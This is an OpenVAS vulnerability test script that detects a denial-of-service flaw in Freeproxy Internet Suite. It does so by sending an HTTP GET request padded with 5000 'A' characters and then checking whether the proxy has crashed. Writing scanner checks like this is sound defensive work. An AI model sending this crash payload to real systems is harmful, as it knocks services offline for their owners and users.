###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeproxy_internet_suite_dos_vul.nasl 5884 2017-04-06 14:57:35Z teissa $
#
# Freeproxy Internet Suite Denial of Service Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:freeproxy_internet_suite:freeproxy";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806895");
  script_version("$Revision: 5884 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-04-06 16:57:35 +0200 (Thu, 06 Apr 2017) $");
  script_tag(name:"creation_date", value:"2016-05-17 11:03:06 +0530 (Tue, 17 May 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Freeproxy Internet Suite Denial of Service Vulnerability");

  script_tag(name:"summary" , value:"This host is installed with Freeproxy
  Internet Suite and is prone to denial of service vulnerability.");

  script_tag(name:"vuldetect" , value:"Send a crafted request via HTTP GET
  and check whether it is able to crash the application or not.");

  script_tag(name:"insight" , value:"The flaw is due to improper validation of
  GET request to the proxy.");

  script_tag(name:"impact" , value:"Successful exploitation will allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.

  Impact Level: Application");

  script_tag(name:"affected" , value:"Freeproxy Internet Suite 4.10.1751");

  script_tag(name:"solution" , value:"No solution or patch is available as
  of 06th April, 2017. Information regarding this issue will be updated once
  the solution details are available.
  For updates refer to http://www.handcraftedsoftware.org/index.php?page=download");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name:"URL" , value:"https://www.exploit-db.com/exploits/39517/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_freeproxy_internet_suite_detect.nasl");
  script_mandatory_keys("Freeproxy/installed");
  script_require_ports("Services/www", 8080);
  exit(0);
}


include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Get http Port
freePort = get_app_port(cpe:CPE);
if(!freePort){
  exit(0);
}  

if(http_is_dead(port:freePort)){
  exit(0);
}

##Contruct Crap data
junk = crap( data:"A", length:5000 );

##Send request and receive response
buffer  = 'GET http://::../'+junk+'/index.html HTTP/1.1\r\n'+
 	  'Host: www.xyz.com\r\n'+
	  'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
	  '\r\n\r\n';

req = http_keepalive_send_recv(port:freePort, data:buffer);

sleep(3);

##Cofirm exploit
if(http_is_dead(port:freePort))
{
  security_message(port:freePort);  
}
exit(0);
